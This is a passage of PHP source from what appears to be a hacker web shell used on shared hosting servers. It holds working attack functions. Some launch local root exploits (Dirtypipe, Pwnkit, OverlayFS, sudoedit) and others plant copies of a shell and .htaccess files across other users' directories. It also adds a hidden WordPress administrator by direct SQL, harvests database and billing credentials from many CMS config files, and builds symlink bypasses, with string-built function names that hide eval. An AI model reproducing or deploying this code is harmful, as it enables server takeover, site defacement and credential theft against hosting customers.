                        <pre><code>Netfilter : '.root("timeout 10 ./R00ting/netfilter", $phtt).'Ptrace : '.root("echo id | timeout 10 ./R00ting/ptrace", $phtt).'Sequoia : '.root("timeout 10 ./R00ting/sequoia", $phtt).'OverlayFS : '.root("echo id | timeout 10 ./overlayfs", $phtt."/R00ting").'Dirtypipe : '.root("echo id | timeout 10 ./R00ting/dirtypipe /usr/bin/su", $phtt).'Sudo : '.root("echo 12345 | timeout 10 sudoedit -s Y", $phtt).'Pwnkit : '.root("timeout 10 ./pwnkit 'id'", $phtt."/R00ting").'</code></pre>
                    </div>
            </div>
        </div>';
    }
}
function scansuid() {
    if (isset($_GET['action']) && $_GET['action'] == 'scansuid') {
        echo '<div class="p-2">
            <div class="row justify-content-center">
                <div class="card text-dark col-md-7 mb-3">
                        <pre><code>'.LewsEx("find / -perm -u=s -type f 2>/dev/null").'</code></pre>
                    </div>
            </div>
        </div>';
    }
}
function bypassglob() {
    if (isset($_GET['action']) && $_GET['action'] == 'bypassglob') {
    echo "<center>";
    echo '<form method="post" onsubmit="document.getElementById(\'komendnya\').value = btoa(btoa(btoa(document.getElementById(\'komendnya\').value)))">
    PATH EXAMPLE : /home
    <br>
    <input type="text" name="pathglober" style="background-color: #1f1f1f; color: #fff">
    <br>
    PATH EXAMPLE : /home/youruser/public_html/path/yourshell.php
    <br>
    <input type="text" name="scriptglob" style="background-color: #1f1f1f; color: #fff">
    <br><br>
    <input class="btn btn-outline-light" type="submit" name="bypassglob" value="execute" class="up" style="cursor: pointer; border-color: #fff">
    </form><br>';
    if (isset($_POST['bypassglob'])) {
        $directoriess = glob($somePath . $_POST['pathglober'].'/*/*/', GLOB_ONLYDIR);
        foreach($directoriess as $dest){
            $bb = $_POST['scriptglob'];
            $a = file_get_contents($bb);
            $name = 'indexx.php';
            $b = file_put_contents($dest.$name,$a);
            if(!$b) { 
                echo "<center><font color='red'>$dest > File can't be copied!</font><br>"; 
            } 
            else { 
                echo "<center>".$dest.$name." > File has been copied!<br>"; 
            }
        }

    }
    echo "</center>";

}
}

// Bypass function
function QiUyTbAgHk($s)
{
    $b = 's' . 'u' . 'b' . 'e' . 'v' . 'a' . 'l';
    return $b($s);
}
function OaQiLmKnH($s)
{
    $b = 'f' . 'i' . 'l' . 'e' . '_' . 'e' . 'x' . 'i' . 's' . 't' . 's';
    return $b($s);
}
function QtGdPsAnMQ($s, $a)
{
    $b = 'f'.'o'.'p'.'e'.'n';
    return $b($s, $a);
}

function kkk()
{
    $text = $_POST["script"];
    // Inisialisasi variabel untuk menyimpan output OK dan ERR
    $outputOK = "";
    $outputERR = "";

    // Output untuk tabel OK
    function writeOK($filepath, &$outputOK)
    {
        $outputOK .= "<tr><td>$filepath</td></tr>";
    }

    // Output untuk tabel ERR
    function writeERR($filepath, &$outputERR, $permission = "")
    {
        $outputERR .= "<tr><td>$filepath</td><td>$permission</td></tr>";
    }

    function writeToWritableDirectories($dir, $file, $text, &$outputOK, &$outputERR)
    {
        $filepath = "$dir/$file";
        $handle = fopen($filepath, "w");
        if ($handle !== false) {
            fwrite($handle, $text);
            fclose($handle);
            writeOK($filepath, $outputOK);
        } else {
            $permission = substr(sprintf('%o', fileperms($dir . '/')), -4);
            writeERR($filepath, $outputERR, $permission);
        }

        $dirs = array_filter(glob("$dir/*"), "is_dir");
        foreach ($dirs as $subdir) {
            writeToWritableDirectories($subdir, $file, $text, $outputOK, $outputERR);
        }
    }

    try {
        writeToWritableDirectories(
            $_POST["d_dir"],
            "\x2E\x68\x74\x61\x63\x63\x65\x73\x73",
            $text,
            $outputOK,
            $outputERR
        );
    } catch (Exception $e) {
        // Tangani kesalahan secara umum jika diperlukan
        // Contoh: echo $e->getMessage();
    }

    echo "<div style='overflow:auto; height:200px; width: 45%; float:left;'>";
    echo "<caption style='color:green;'>OK Status</caption>";
    echo "<table>";
    echo "<tbody>";
    echo $outputOK;
    echo "</tbody>";
    echo "</table>";
    echo "</div>";

    echo "<div style='overflow:auto; height:200px; width: 45%; float:right;'>";
    echo "<caption style='color:red;'>ERROR Status</caption>";
    echo "<table>";
    echo "<tbody>";
    echo $outputERR;// Tambahkan penutup tag tbody
    echo "</table>";
    echo "</div>";
}

function addnewadmin() {
    echo'<center>';
    echo '<table border="2">';
    echo '<div class=header><center><br><div class="txtfont_header">| Add New Admin |</div><center><h3>';
    echo '<form action="" method="post">';
    echo '<p> WordPress </p></h3>';
    echo '<tr><td>Database Host: </td><td><input type="text" name="db_host" size="30"></td></tr>';
    echo '<tr><td>Database Name: </td><td><input type="text" name="db_name" size="30"></td></tr>';
    echo '<tr><td>Database Username: </td><td><input type="text" name="db_username" size="30"></td></tr>';
    echo '<tr><td>Database Password: </td><td><input type="password" name="db_password" size="30"></td></tr>';
    echo '<tr><td>Admin Username: </td><td><input type="text" name="admin_username" size="30"></td></tr>';
    echo '<tr><td>Admin Password: </td><td><input type="password" name="admin_password" size="30"></td></tr>';
    echo '<tr><td>Admin Email: </td><td><input type="text" name="admin_email" size="30"></td></tr>';
    echo '<tr><td>Table Prefix: </td><td><input type="text" name="prefix" size="30"></td></tr>';
    echo '<tr><td colspan="2"><input class="btn btn-outline-light" type="submit" value="Submit"></td></tr>';
    echo '</form>';
    echo '</table>';
    echo'</center>';
    if ($_SERVER["REQUEST_METHOD"] == "POST") {
        $db_host = $_POST['db_host'];
        $db_name = $_POST['db_name'];
        $db_username = $_POST['db_username'];
        $db_password = $_POST['db_password'];
        $admin_username = $_POST['admin_username'];
        $admin_password = $_POST['admin_password'];
        $admin_email = $_POST['admin_email'];
        $prefix = $_POST['prefix'];

        // Koneksi ke database MySQL
        $conn = @mysqli_connect($db_host, $db_username, $db_password, $db_name) or die(mysqli_error($conn));

        // Hash password admin sesuai format yang digunakan oleh WordPress
        $hashed_password = password_hash($admin_password, PASSWORD_DEFAULT);

        // Memasukkan data admin baru ke dalam tabel pengguna (users)
        $insert_user_query = "INSERT INTO ".$prefix."users (user_login, user_pass, user_email) VALUES ('$admin_username', '$hashed_password', '$admin_email')";
        $insert_user_result = @mysqli_query($conn, $insert_user_query);

        if ($insert_user_result) {
            // Mendapatkan ID pengguna yang baru saja dimasukkan
            $user_id = mysqli_insert_id($conn);

            // Memasukkan meta-data tambahan untuk pengguna
            $insert_user_meta_query = "INSERT INTO ".$prefix."usermeta (user_id, meta_key, meta_value) VALUES ";
            $insert_user_meta_query .= "('$user_id', '".$prefix."capabilities', 'a:1:{s:13:\"administrator\";b:1;}'), ";
            $insert_user_meta_query .= "('$user_id', '".$prefix."user_level', '10')";

            $insert_user_meta_result = @mysqli_query($conn, $insert_user_meta_query);

            if ($insert_user_meta_result) {
                echo "Success... ".$admin_username." is created.";
            } else {
                echo "Failed to create admin meta-data: " . mysqli_error($conn);
            }
        } else {
            echo "Failed to create admin: " . mysqli_error($conn);
        }

        // Menutup koneksi database
        mysqli_close($conn);
    }
}

function aksiJump($dir, $file, $ip) {
    $i = 0;
    echo "<div class='card container'>";
    if (preg_match('/hsphere/', $dir)) {
        $urls = explode("\r\n", $_POST['url']);
        if (isset($_POST['jump'])) {
            echo '<pre>';
            foreach ($urls as $url) {
                $url = str_replace(['http://', 'www.'], '', strtolower($url));
                $etc = '/etc/passwd';
                $f = fopen($etc, 'r');
                while ($gets = fgets($f)) {
                    $pecah = explode(':', $gets);
                    $user = $pecah[0];
                    $dir_user = "/hsphere/local/home/$user";
                    if (is_dir($dir_user) === true) {
                        $url_user = $dir_user.'/'.$url;
                        if (is_readable($url_user)) {
                            $i++;
                            $jrw = "[<font color=green>R</font>] <a href='?dir=$url_user'><font color=#0046FF>$url_user</font></a>";
                            if (is_writable($url_user)) {
                                $jrw = "[<font color=green>RW</font>] <a href='?dir=$url_user'><font color=#0046FF>$url_user</font></a>";
                            }
                            echo $jrw.'<br>';
                        }
                    }
                }
            }
            if (!$i == 0) {
                echo "<br>Total ada $i KAMAR di $ip";
            }
            echo '</pre>';
        } else {
            echo '<center><form method="post">
                List Domains: <br>
                <textarea name="url" class="form-control">';
            $fp = fopen('/hsphere/local/config/httpd/sites/sites.txt', 'r');
            while ($getss = fgets($fp)) {
                echo $getss;
            }
            echo  '</textarea><br>
                      <input type="submit" value="Jumping" name="jump" class="btn btn-danger btn-block">
            </form></center>';
        }
    } elseif (preg_match('/vhosts/', $dir)) {
        $urls = explode("\r\n", $_POST['url']);
        if (isset($_POST['jump'])) {
            echo '<pre>';
            foreach ($urls as $url) {
                $web_vh = "/var/www/vhosts/$url/httpdocs";
                if (is_dir($web_vh) === true) {
                    if (is_readable($web_vh)) {
                        $i++;
                        $jrw = "[<font color=green>R</font>] <a href='?dir=$web_vh'><font color=#0046FF>$web_vh</font></a>";
                        if (is_writable($web_vh)) {
                            $jrw = "[<font color=green>RW</font>] <a href='?dir=$web_vh'><font color=#0046FF>$web_vh</font></a>";
                        }
                        echo $jrw.'<br>';
                    }
                }
            }
            if (!$i == 0) {
                echo "<br>Total ada $i Kamar Di $ip";
            }
            echo '</pre>';
        } else {
            echo '<center><form method="post">
                List Domains: <br>
                <textarea name="url" class="form-control">';
            bing("ip:$ip");
            echo '</textarea><br>
                <input type="submit" value="Jumping" name="jump" class="btn btn-danger btn-block">
            </form></center>';
        }
    } else {
        echo '<pre>';
        $etc = fopen('/etc/passwd', 'r') or die("<font color=red>Can't read /etc/passwd</font><br/>");
        while ($passwd = fgets($etc)) {
            if ($passwd == '' || !$etc) {
                echo "<font color=red>Can't read /etc/passwd</font><br/>";
            } else {
                preg_match_all('/(.*?):x:/', $passwd, $user_jumping);
                foreach ($user_jumping[1] as $user_pro_jump) {
                    $user_jumping_dir = "/home/$user_pro_jump/public_html";
                    if (is_readable($user_jumping_dir)) {
                        $i++;
                        $jrw = "[<font color=green>R</font>] <a href='?dir=$user_jumping_dir'><font color=#0046FF>$user_jumping_dir</font></a>";
                        if (is_writable($user_jumping_dir)) {
                            $jrw = "[<font color=green>RW</font>] <a href='?dir=$user_jumping_dir'><font color=#0046FF>$user_jumping_dir</font></a>";
                        }
                        echo $jrw;
                        if (function_exists('posix_getpwuid')) {
                            $domain_jump = file_get_contents('/etc/named.conf');
                            if ($domain_jump == '') {
                                echo ' => ( <font color=red>gabisa ambil nama domain nya</font> )<br>';
                            } else {
                                preg_match_all('#/var/named/(.*?).db#', $domain_jump, $domains_jump);
                                foreach ($domains_jump[1] as $dj) {
                                    $user_jumping_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
                                    $user_jumping_url = $user_jumping_url['name'];
                                    if ($user_jumping_url == $user_pro_jump) {
                                        echo " => ( <u>$dj</u> )<br>";
                                        break;
                                    }
                                }
                            }
                        } else {
                            echo '<br>';
                        }
                    }
                }
            }
        }
        if (!$i == 0) {
            echo "<br>Total ada $i kamar di $ip";
        }
        echo '</pre>';
    }
    echo '</div><br/>';
    exit;
}

function aksiConfig($dir, $file) {
    if ($_POST) {
        $passwd = $_POST['passwd'];
        mkdir('saskra_config', 0777);
        $isi_htc = 'Options allnRequire NonenSatisfy Any';
        $htc = fopen('saskra_config/.htaccess', 'w');
        fwrite($htc, $isi_htc);
        preg_match_all('/(.*?):x:/', $passwd, $user_config);
        foreach ($user_config[1] as $user_con) {
            $user_config_dir = "/home/$user_con/public_html/";
            if (is_readable($user_config_dir)) {
                $grab_config = [
                    "/home/$user_con/.my.cnf" => 'cpanel',
                    "/home/$user_con/public_html/config/koneksi.php" => 'Lokomedia',
                    "/home/$user_con/public_html/forum/config.php" => 'phpBB',
                    "/home/$user_con/public_html/sites/default/settings.php" => 'Drupal',
                    "/home/$user_con/public_html/config/settings.inc.php" => 'PrestaShop',
                    "/home/$user_con/public_html/app/etc/local.xml" => 'Magento',
                    "/home/$user_con/public_html/admin/config.php" => 'OpenCart',
                    "/home/$user_con/public_html/application/config/database.php" => 'Ellislab',
                    "/home/$user_con/public_html/vb/includes/config.php" => 'Vbulletin',
                    "/home/$user_con/public_html/includes/config.php" => 'Vbulletin',
                    "/home/$user_con/public_html/forum/includes/config.php" => 'Vbulletin',
                    "/home/$user_con/public_html/forums/includes/config.php" => 'Vbulletin',
                    "/home/$user_con/public_html/cc/includes/config.php" => 'Vbulletin',
                    "/home/$user_con/public_html/inc/config.php" => 'MyBB',
                    "/home/$user_con/public_html/includes/configure.php" => 'OsCommerce',
                    "/home/$user_con/public_html/shop/includes/configure.php" => 'OsCommerce',
                    "/home/$user_con/public_html/os/includes/configure.php" => 'OsCommerce',
                    "/home/$user_con/public_html/oscom/includes/configure.php" => 'OsCommerce',
                    "/home/$user_con/public_html/products/includes/configure.php" => 'OsCommerce',
                    "/home/$user_con/public_html/cart/includes/configure.php" => 'OsCommerce',
                    "/home/$user_con/public_html/inc/conf_global.php" => 'IPB',
                    "/home/$user_con/public_html/wp-config.php" => 'Wordpress',
                    "/home/$user_con/public_html/wp/test/wp-config.php" => 'Wordpress',
                    "/home/$user_con/public_html/blog/wp-config.php" => 'Wordpress',
                    "/home/$user_con/public_html/beta/wp-config.php" => 'Wordpress',
                    "/home/$user_con/public_html/portal/wp-config.php" => 'Wordpress',
                    "/home/$user_con/public_html/site/wp-config.php" => 'Wordpress',
                    "/home/$user_con/public_html/wp/wp-config.php" => 'Wordpress',
                    "/home/$user_con/public_html/WP/wp-config.php" => 'Wordpress',
                    "/home/$user_con/public_html/news/wp-config.php" => 'Wordpress',
                    "/home/$user_con/public_html/wordpress/wp-config.php" => 'Wordpress',
                    "/home/$user_con/public_html/test/wp-config.php" => 'Wordpress',
                    "/home/$user_con/public_html/demo/wp-config.php" => 'Wordpress',
                    "/home/$user_con/public_html/home/wp-config.php" => 'Wordpress',
                    "/home/$user_con/public_html/v1/wp-config.php" => 'Wordpress',
                    "/home/$user_con/public_html/v2/wp-config.php" => 'Wordpress',
                    "/home/$user_con/public_html/press/wp-config.php" => 'Wordpress',
                    "/home/$user_con/public_html/new/wp-config.php" => 'Wordpress',
                    "/home/$user_con/public_html/blogs/wp-config.php" => 'Wordpress',
                    "/home/$user_con/public_html/configuration.php" => 'Joomla',
                    "/home/$user_con/public_html/blog/configuration.php" => 'Joomla',
                    "/home/$user_con/public_html/submitticket.php" => '^WHMCS',
                    "/home/$user_con/public_html/cms/configuration.php" => 'Joomla',
                    "/home/$user_con/public_html/beta/configuration.php" => 'Joomla',
                    "/home/$user_con/public_html/portal/configuration.php" => 'Joomla',
                    "/home/$user_con/public_html/site/configuration.php" => 'Joomla',
                    "/home/$user_con/public_html/main/configuration.php" => 'Joomla',
                    "/home/$user_con/public_html/home/configuration.php" => 'Joomla',
                    "/home/$user_con/public_html/demo/configuration.php" => 'Joomla',
                    "/home/$user_con/public_html/test/configuration.php" => 'Joomla',
                    "/home/$user_con/public_html/v1/configuration.php" => 'Joomla',
                    "/home/$user_con/public_html/v2/configuration.php" => 'Joomla',
                    "/home/$user_con/public_html/joomla/configuration.php" => 'Joomla',
                    "/home/$user_con/public_html/new/configuration.php" => 'Joomla',
                    "/home/$user_con/public_html/WHMCS/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/whmcs1/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/Whmcs/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/whmcs/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/whmcs/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/WHMC/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/Whmc/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/whmc/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/WHM/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/Whm/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/whm/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/HOST/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/Host/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/host/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/SUPPORTES/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/Supportes/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/supportes/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/domains/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/domain/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/Hosting/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/HOSTING/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/hosting/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/CART/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/Cart/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/cart/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/ORDER/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/Order/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/order/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/CLIENT/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/Client/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/client/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/CLIENTAREA/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/Clientarea/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/clientarea/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/SUPPORT/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/Support/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/support/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/BILLING/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/Billing/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/billing/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/BUY/sumitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/Buy/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/buy/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/MANAGE/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/Manage/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/manage/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/CLIENTSUPPORT/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/ClientSupport/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/Clientsupport/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/clientsupport/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/CHECKOUT/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/Checkout/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/checkout/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/BILLINGS/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/Billings/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/billings/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/BASKET/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/Basket/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/basket/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/SECURE/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/Secure/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/secure/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/SALES/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/Sales/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/sales/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/BILL/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/Bill/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/bill/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/PURCHASE/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/Purchase/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/purchase/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/ACCOUNT/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/Account/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/account/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/USER/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/User/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/user/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/CLIENTS/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/Clients/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/clients/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/BILLINGS/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/Billings/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/billings/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/MY/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/My/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/my/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/secure/whm/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/secure/whmcs/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/panel/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/clientes/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/cliente/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/support/order/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/bb-config.php" => 'BoxBilling',
                    "/home/$user_con/public_html/boxbilling/bb-config.php" => 'BoxBilling',
                    "/home/$user_con/public_html/box/bb-config.php" => 'BoxBilling',
                    "/home/$user_con/public_html/host/bb-config.php" => 'BoxBilling',
                    "/home/$user_con/public_html/Host/bb-config.php" => 'BoxBilling',
                    "/home/$user_con/public_html/supportes/bb-config.php" => 'BoxBilling',
                    "/home/$user_con/public_html/support/bb-config.php" => 'BoxBilling',
                    "/home/$user_con/public_html/hosting/bb-config.php" => 'BoxBilling',
                    "/home/$user_con/public_html/cart/bb-config.php" => 'BoxBilling',
                    "/home/$user_con/public_html/order/bb-config.php" => 'BoxBilling',
                    "/home/$user_con/public_html/client/bb-config.php" => 'BoxBilling',
                    "/home/$user_con/public_html/clients/bb-config.php" => 'BoxBilling',
                    "/home/$user_con/public_html/cliente/bb-config.php" => 'BoxBilling',
                    "/home/$user_con/public_html/clientes/bb-config.php" => 'BoxBilling',
                    "/home/$user_con/public_html/billing/bb-config.php" => 'BoxBilling',
                    "/home/$user_con/public_html/billings/bb-config.php" => 'BoxBilling',
                    "/home/$user_con/public_html/my/bb-config.php" => 'BoxBilling',
                    "/home/$user_con/public_html/secure/bb-config.php" => 'BoxBilling',
                    "/home/$user_con/public_html/support/order/bb-config.php" => 'BoxBilling',
                    "/home/$user_con/public_html/includes/dist-configure.php" => 'Zencart',
                    "/home/$user_con/public_html/zencart/includes/dist-configure.php" => 'Zencart',
                    "/home/$user_con/public_html/products/includes/dist-configure.php" => 'Zencart',
                    "/home/$user_con/public_html/cart/includes/dist-configure.php" => 'Zencart',
                    "/home/$user_con/public_html/shop/includes/dist-configure.php" => 'Zencart',
                    "/home/$user_con/public_html/includes/iso4217.php" => 'Hostbills',
                    "/home/$user_con/public_html/hostbills/includes/iso4217.php" => 'Hostbills',
                    "/home/$user_con/public_html/host/includes/iso4217.php" => 'Hostbills',
                    "/home/$user_con/public_html/Host/includes/iso4217.php" => 'Hostbills',
                    "/home/$user_con/public_html/supportes/includes/iso4217.php" => 'Hostbills',
                    "/home/$user_con/public_html/support/includes/iso4217.php" => 'Hostbills',
                    "/home/$user_con/public_html/hosting/includes/iso4217.php" => 'Hostbills',
                    "/home/$user_con/public_html/cart/includes/iso4217.php" => 'Hostbills',
                    "/home/$user_con/public_html/order/includes/iso4217.php" => 'Hostbills',
                    "/home/$user_con/public_html/client/includes/iso4217.php" => 'Hostbills',
                    "/home/$user_con/public_html/clients/includes/iso4217.php" => 'Hostbills',
                    "/home/$user_con/public_html/cliente/includes/iso4217.php" => 'Hostbills',
                    "/home/$user_con/public_html/clientes/includes/iso4217.php" => 'Hostbills',
                    "/home/$user_con/public_html/billing/includes/iso4217.php" => 'Hostbills',
                    "/home/$user_con/public_html/billings/includes/iso4217.php" => 'Hostbills',
                    "/home/$user_con/public_html/my/includes/iso4217.php" => 'Hostbills',
                    "/home/$user_con/public_html/secure/includes/iso4217.php" => 'Hostbills',
                    "/home/$user_con/public_html/support/order/includes/iso4217.php" => 'Hostbills',
                ];
                foreach ($grab_config as $config => $nama_config) {
                    $ambil_config = file_get_contents($config);
                    if ($ambil_config == '') {
                    } else {
                        $file_config = fopen("saskra_config/$user_con-$nama_config.txt", 'w');
                        fwrite($file_config, $ambil_config);
                    }
                }
            }
        }
        echo "<p class='text-center'>Success Get Config!!</p>
        <a href='?dir=$dir/saskra_config' class='btn btn-outline-light' >Click Here</a>";
    } else {
        echo "<form method='post'>
            <p class='text-danger'>/etc/passwd error ?  <p> Using Bypass Etc/Passwd (In Menu) </p></p>
            <textarea name='passwd' class='form-control' rows='13'>".file_get_contents('/etc/passwd')."</textarea><br/>
            <input type='submit' class='btn btn-outline-light' value='Get Config!!'>
        </form>";
    }
    exit;
}

function aksiBypasswd($dir, $file) {
    echo '<div claas="container">
        <form method="POST">
            <p class="text-center">Bypass etc/passwd With :</p>
            <div class="d-flex justify-content-center flex-wrap">
                <input type="submit" class="btn btn-outline-light" value="System Function" name="syst">
                <input type="submit" class="btn btn-outline-light" value="Passthru Function" name="passth">
                <input type="submit" class="btn btn-outline-light" value="Exec Function" name="ex">
                <input type="submit" class="btn btn-outline-light" value="Shell_exec Function" name="shex">
                <input type="submit" class="btn btn-outline-light" value="Posix_getpwuid Function" name="melex">
            </div><hr/>
            <p class="text-center">Bypass User With :</p>
            <div class="d-flex justify-content-center flex-wrap">
                <input type="submit" class="btn btn-outline-light" value="Awk Program" name="awkuser">
                <input type="submit" class="btn btn-outline-light" value="System Function" name="systuser">
                <input type="submit" class="btn btn-outline-light" value="Passthru Function" name="passthuser">    
                <input type="submit" class="btn btn-outline-light" value="Exec Function" name="exuser">        
                <input type="submit" class="btn btn-outline-light" value="Shell_exec Function" name="shexuser">
            </div>
        </form>';
    $mail = 'ls /var/mail';
    $paswd = '/etc/passwd';
    if ($_POST['syst']) {
        echo"<textarea class='form-control' rows='13'>";
        echo system("cat $paswd");
        echo'</textarea><br/>';
    }
    if ($_POST['passth']) {
        echo"<textarea class='form-control' rows='13'>";
        echo passthru("cat $paswd");
        echo'</textarea><br/>';
    }
    if ($_POST['ex']) {
        echo"<textarea class='form-control' rows='13'>";
        echo exec("cat $paswd");
        echo'</textarea><br/>';
    }
    if ($_POST['shex']) {
        echo"<textarea class='form-control' rows='13'>";
        echo shell_exec("cat $paswd");
        echo'</textarea><br/>';
    }
    if ($_POST['melex']) {
        echo"<textarea class='form-control' rows='13'>";
        for ($uid = 0; $uid < 6000; $uid++) {
            $ara = posix_getpwuid($uid);
            if (!empty($ara)) {
                while (list($key, $val) = each($ara)) {
                    echo "$val:";
                }
                echo 'n';
            }
        }
        echo'</textarea><br/>';
    }

    if ($_POST['awkuser']) {
        echo"<textarea class='form-control' rows='13'>
                ".shell_exec("awk -F: '{ print $1 }' $paswd | sort").'
            </textarea><br/>';
    }
    if ($_POST['systuser']) {
        echo"<textarea class='form-control' rows='13'>";
        echo system("$mail");
        echo '</textarea><br>';
    }
    if ($_POST['passthuser']) {
        echo"<textarea class='form-control' rows='13'>";
        echo passthru("$mail");
        echo '</textarea><br>';
    }
    if ($_POST['exuser']) {
        echo"<textarea class='form-control' rows='13'>";
        echo exec("$mail");
        echo '</textarea><br>';
    }
    if ($_POST['shexuser']) {
        echo"<textarea class='form-control' rows='13'>";
        echo shell_exec("$mail");
        echo '</textarea><br>';
    }
    echo '</div>';
    exit;
}

function aksiSym($dir, $file) {
    $full = str_replace($_SERVER['DOCUMENT_ROOT'], '', $dir);
    $d0mains = @file('/etc/named.conf');
    if (!$d0mains) {
        die("[ <a href='?dir=$dir&aksi=symread'>Bypass Read</a> ] [ <a href='?dir=$dir&aksi=sym_404'>Symlink 404</a> ] [ <a href='?dir=$dir&aksi=sym_bypas'>Symlink Bypass</a> ]<br/><font color='red'>Error tidak dapat membaca  /etc/named.conf</font><br/><br/>");
    }
    //#htaccess
    if ($d0mains) {
        @mkdir('saskra_sym', 0777);
        @chdir('saskra_sym');
        @exe('ln -s / root');
        $file3 = 'Options Indexes FollowSymLinks
        DirectoryIndex indsc.html
        AddType text/plain php html php5 phtml
        AddHandler text/plain php html php5 phtml
        Satisfy Any';
        $fp3 = fopen('.htaccess', 'w');
        $fw3 = fwrite($fp3, $file3);
        @fclose($fp3);
        echo "[ <a href='?dir=$dir&aksi=symread'>Bypass Read</a> ] [ <a href='?dir=$dir&aksi=sym_404'>Symlink 404</a> ] [ <a href='?dir=$dir&aksi=sym_bypas'>Symlink Bypass</a> ]
        <div class='tmp'>
        <table class='text-center table-responsive'>
            <thead class='bg-info'>
                <th>No.</th>
                <th>Domains</th>
                <th>Users</th>
                <th>symlink </th>
            </thead>";
        $dcount = 1;
        foreach ($d0mains as $d0main) {
            if (eregi('zone', $d0main)) {
                preg_match_all('#zone "(.*)"#', $d0main, $domains);
                flush();
                if (strlen(trim($domains[1][0])) > 2) {
                    $user = posix_getpwuid(@fileowner('/etc/valiases/'.$domains[1][0]));
                    echo '<tr>
                            <td>'.$dcount."</td>
                            <td class='text-left'><a href=http://www.".$domains[1][0].'/>'.$domains[1][0].'</a></td>
